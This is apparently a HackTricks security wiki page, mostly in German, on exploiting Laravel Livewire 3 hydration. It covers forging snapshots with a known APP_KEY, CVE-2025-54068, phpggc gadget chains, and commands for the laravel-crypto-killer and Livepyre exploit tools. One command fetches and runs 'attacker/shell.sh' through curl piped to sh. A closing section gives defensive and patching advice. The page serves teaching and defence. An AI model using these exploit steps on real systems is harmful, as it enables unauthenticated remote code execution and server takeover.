# Laravel Livewire Hydration & Synthesizer Abuse

{{#include ../../banners/hacktricks-training.md}}

## Rückblick auf die Livewire-Zustandsmaschine

Livewire 3 Komponenten tauschen ihren Zustand über **snapshots** aus, die `data`, `memo` und eine Prüfsumme enthalten. Jeder POST an `/livewire/update` rehydriert das JSON snapshot serverseitig und führt die wartenden `calls`/`updates` aus.
```php
class Checksum {
static function verify($snapshot) {
$checksum = $snapshot['checksum'];
unset($snapshot['checksum']);
if ($checksum !== self::generate($snapshot)) {
throw new CorruptComponentPayloadException;
}
}

static function generate($snapshot) {
return hash_hmac('sha256', json_encode($snapshot), $hashKey);
}
}
```
Jeder, der den `APP_KEY` besitzt (der zur Ableitung von `$hashKey` verwendet wird), kann daher beliebige Snapshots fälschen, indem er den HMAC neu berechnet.

Komplexe Eigenschaften werden als **synthetische Tupel** kodiert, die von `Livewire\Drawer\BaseUtils::isSyntheticTuple()` erkannt werden; jedes Tupel ist `[value, {"s":"<key>", ...meta}]`. Der Hydrationskern delegiert einfach jedes Tupel an den Synth, der in `HandleComponents::$propertySynthesizers` ausgewählt ist, und rekursiv über die Kinder:
```php
protected function hydrate($valueOrTuple, $context, $path)
{
if (! Utils::isSyntheticTuple($value = $tuple = $valueOrTuple)) return $value;
[$value, $meta] = $tuple;
$synth = $this->propertySynth($meta['s'], $context, $path);
return $synth->hydrate($value, $meta, fn ($name, $child)
=> $this->hydrate($child, $context, "{$path}.{$name}"));
}
```
Dieses rekursive Design macht Livewire zu einer **generischen Objekt-Instantiierungs-Engine**, sobald ein Angreifer entweder die Tuple-Metadaten oder irgendein während der Rekursion verarbeitete verschachtelte Tuple kontrolliert.

## Synthesizer, die Gadget-Primitiven bereitstellen

| Synthesizer | Vom Angreifer kontrolliertes Verhalten |
|-------------|----------------------------------------|
| **CollectionSynth (`clctn`)** | Instanziiert `new $meta['class']($value)` nachdem jedes Kind rehydriert wurde. Jede Klasse mit einem Konstruktor, der ein Array akzeptiert, kann erstellt werden, und jedes Element kann selbst ein synthetisches Tuple sein.
| **FormObjectSynth (`form`)** | Ruft `new $meta['class']($component, $path)` auf und weist dann jede öffentliche Eigenschaft aus vom Angreifer kontrollierten Kindern über `$hydrateChild` zu. Konstruktoren, die zwei schwach typisierte Parameter (oder Standardargumente) akzeptieren, reichen aus, um beliebige öffentliche Eigenschaften zu erreichen.
| **ModelSynth (`mdl`)** | Wenn `key` in meta fehlt, führt es `return new $class;` aus, was eine Instanziierung ohne Argumente jeder Klasse unter Kontrolle des Angreifers ermöglicht.

Weil Synths `$hydrateChild` auf jedes verschachtelte Element aufrufen, können durch rekursives Stapeln von Tuples beliebige Gadget-Graphen aufgebaut werden.

## Fälschen von Snapshots, wenn `APP_KEY` bekannt ist

1. Erfasse eine legitime `/livewire/update`-Anfrage und dekodiere `components[0].snapshot`.
2. Injiziere verschachtelte Tuples, die auf Gadget-Klassen zeigen, und berechne `checksum = hash_hmac('sha256', json_encode(snapshot_without_checksum), APP_KEY)` neu.
3. Re-kodiere den Snapshot, lasse `_token`/`memo` unverändert und spiele die Anfrage erneut ab.

Ein minimaler Proof-of-Execution nutzt Guzzle's `FnStream` und Flysystem's `ShardedPrefixPublicUrlGenerator`. Ein Tuple instanziiert `FnStream` mit Konstruktordaten `{ "__toString": "phpinfo" }`, das nächste instanziiert `ShardedPrefixPublicUrlGenerator` mit `[FnStreamInstance]` als `$prefixes`. Wenn Flysystem jedes Prefix zu `string` castet, ruft PHP das vom Angreifer bereitgestellte `__toString`-Callable auf und damit jede Funktion ohne Argumente.

### Von Funktionsaufrufen zu vollständigem RCE

Unter Ausnutzung von Livewire's Instanziierungs-Primitiven passte Synacktiv die phpggc-Chain `Laravel/RCE4` so an, dass die Hydration ein Objekt initialisiert, dessen öffentlicher Queueable-Zustand die Deserialisierung auslöst:

1. **Queueable trait** – jedes Objekt, das `Illuminate\Bus\Queueable` verwendet, exponiert public `$chained` und führt `unserialize(array_shift($this->chained))` in `dispatchNextJobInChain()` aus.
2. **BroadcastEvent wrapper** – `Illuminate\Broadcasting\BroadcastEvent` (ShouldQueue) wird via `CollectionSynth` / `FormObjectSynth` instanziiert, wobei public `$chained` gefüllt ist.
3. **phpggc Laravel/RCE4Adapted** – der serialisierte Blob in `$chained[0]` baut `PendingBroadcast -> Validator -> SerializableClosure\Serializers\Signed`. `Signed::__invoke()` ruft schließlich `call_user_func_array($closure, $args)` auf und ermöglicht so `system($cmd)`.
4. **Stealth termination** – indem ein zweites `FnStream`-Callable wie `[new Laravel\Prompts\Terminal(), 'exit']` übergeben wird, endet die Anfrage mit `exit()` statt einer lauten Exception, wodurch die HTTP-Antwort sauber bleibt.

### Automatisierung der Snapshot-Fälschung

`synacktiv/laravel-crypto-killer` liefert jetzt einen `livewire`-Modus, der alles zusammensetzt:
```bash
./laravel_crypto_killer.py exploit -e livewire -k base64:APP_KEY \
-j request.json --function system -p "bash -c 'id'"
```
Das Tool parst den aufgenommenen Snapshot, injiziert die gadget tuples, berechnet die checksum neu und gibt eine versandbereite `/livewire/update`-Payload aus.

## CVE-2025-54068 – RCE ohne `APP_KEY`

Laut dem Herstellerhinweis betrifft das Problem Livewire v3 (>= 3.0.0-beta.1 und < 3.6.3) und ist einzigartig für v3.

`updates` werden in den component state zusammengeführt **nachdem** die snapshot checksum validiert wurde. Wenn eine Eigenschaft im Snapshot ein (oder zu einem) synthetic tuple wird, verwendet Livewire dessen meta erneut, während es den attacker-controlled update value hydriert:
```php
protected function hydrateForUpdate($raw, $path, $value, $context)
{
$meta = $this->getMetaForPath($raw, $path);
if ($meta) {
return $this->hydrate([$value, $meta], $context, $path);
}
}
```
Exploit recipe:

1. Finde eine Livewire-Komponente mit einer ungetypten public-Eigenschaft (z. B. `public $count;`).
2. Sende ein Update, das diese Eigenschaft auf `[]` setzt. Der nächste Snapshot speichert sie dann als `[[], {"s": "arr"}]`.

A minimal type-juggling flow looks like this:

```http
POST /livewire/update
...
"updates": {"count": []}
```

Then the next snapshot stores a tuple that keeps the `arr` synthesizer metadata:

```json
"count": [[], {"s": "arr"}]
```

3. Erzeuge eine weitere `updates`-Payload, in der diese Eigenschaft ein tief verschachteltes Array enthält, das Tuples wie `[ <payload>, {"s":"clctn","class":"GuzzleHttp\\Psr7\\FnStream"} ]` einbettet.
4. Während der Rekursion wertet `hydrate()` jedes verschachtelte Element unabhängig aus, sodass vom Angreifer gewählte synth-Schlüssel/-Klassen berücksichtigt werden, obwohl das äußere Tuple und die checksum nie geändert wurden.
5. Verwende dieselben `CollectionSynth`/`FormObjectSynth`-Primitiven wieder, um ein Queueable-Gadget zu instanziieren, dessen `$chained[0]` die phpggc-Payload enthält. Livewire verarbeitet die gefälschten updates, ruft `dispatchNextJobInChain()` auf und erreicht `system(<cmd>)`, ohne den `APP_KEY` zu kennen.

Key reasons this works:

- `updates` werden nicht durch die Snapshot-Checksum abgesichert.
- `getMetaForPath()` vertraut auf die Synth-Metadaten, die bereits für diese Eigenschaft existierten, selbst wenn der Angreifer sie zuvor durch schwache Typisierung in ein Tuple gezwungen hat.
- Rekursion plus schwache Typisierung erlauben, dass jedes verschachtelte Array als ein komplett neues Tuple interpretiert wird, sodass beliebige synth-Schlüssel und beliebige Klassen schließlich die Hydration erreichen.

## Livepyre – end-to-end exploitation

[Livepyre](https://github.com/synacktiv/Livepyre) automates both the APP_KEY-less CVE and the signed-snapshot path:

- Ermittelt die eingesetzte Livewire-Version, indem es `<script src="/livewire/livewire.js?id=HASH">` parst und den Hash auf verwundbare Releases abbildet.
- Sammelt Basis-Snapshots, indem es harmlose Aktionen wiedergibt und `components[].snapshot` extrahiert.
- Generiert entweder eine nur-`updates` Payload (CVE-2025-54068) oder einen gefälschten Snapshot (bekannter APP_KEY), der die phpggc-Kette einbettet.
- Falls in einem Snapshot kein parameter vom Typ object gefunden wird, fällt Livepyre auf Brute-Forcen möglicher Parameter zurück, um eine konvertierbare Eigenschaft zu erreichen.

Typical usage:
```bash
# CVE-2025-54068, unauthenticated
python3 Livepyre.py -u https://target/livewire/component -f system -p id

# Signed snapshot exploit with known APP_KEY
python3 Livepyre.py -u https://target/livewire/component -a base64:APP_KEY \
-f system -p "bash -c 'curl attacker/shell.sh|sh'"
```
`-c/--check` führt eine nicht-destruktive Prüfung aus, `-F` überspringt die Versionssperre, `-H` und `-P` fügen benutzerdefinierte Header oder Proxies hinzu, und `--function/--param` passen die `php`-Funktion an, die von der Gadget-Kette aufgerufen wird.

## Defensive Überlegungen

- Auf die gepatchten Livewire-Builds (>= 3.6.4 laut dem Sicherheitsbulletin des Herstellers) aktualisieren und den Patch des Herstellers für CVE-2025-54068 einspielen.
- Vermeide schwach typisierte public properties in Livewire-Komponenten; explizite skalare Typen verhindern, dass Eigenschaftswerte in Arrays/Tuples gezwungen werden.
- Registriere nur die Synthesizer, die du wirklich brauchst, und behandle benutzerkontrollierte Metadaten (`$meta['class']`) als nicht vertrauenswürdig.
- Weise Updates zurück, die den JSON-Typ einer Eigenschaft ändern (z. B. scalar -> array), es sei denn, dies ist explizit erlaubt, und leite die Synth-Metadaten neu ab, statt veraltete Tuples wiederzuverwenden.
- Rotieren/Ändere `APP_KEY` umgehend nach jeder Offenlegung, da er Offline-Snapshot-Fälschungen ermöglicht, ungeachtet davon, wie gepatcht die Codebasis ist.

## References

- [Synacktiv – Livewire: Remote Command Execution via Unmarshaling](https://www.synacktiv.com/publications/livewire-execution-de-commandes-a-distance-via-unmarshaling.html)
- [synacktiv/laravel-crypto-killer](https://github.com/synacktiv/laravel-crypto-killer)
- [synacktiv/Livepyre](https://github.com/synacktiv/Livepyre)
- [GHSA-29cq-5w36-x7w3 – Livewire v3 RCE advisory](https://github.com/livewire/livewire/security/advisories/GHSA-29cq-5w36-x7w3)

{{#include ../../banners/hacktricks-training.md}}
